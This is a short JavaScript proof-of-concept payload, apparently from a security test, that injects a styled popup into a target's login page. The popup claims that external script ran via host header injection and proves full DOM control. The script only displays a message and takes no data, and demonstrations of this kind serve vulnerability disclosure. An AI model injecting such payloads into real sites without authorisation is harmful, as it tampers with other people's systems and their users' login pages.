// Create an attacker-controlled popup (works on login page)
const popup = document.createElement('div');

popup.style.cssText = `
    position: fixed;
    top: 25%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: #111;
    color: #fff;
    padding: 30px 40px;
    font-size: 22px;
    text-align: center;
    border-radius: 12px;
    z-index: 999999999;
    box-shadow: 0 0 20px rgba(0,0,0,0.6);
`;

popup.innerHTML = `
    <h2 style="margin-top:0">XSS PoC</h2>
    <p>External JavaScript Executed via Host Header Injection.</p>
    <p>This popup proves full DOM control on the login page.</p>
`;

document.body.appendChild(popup);
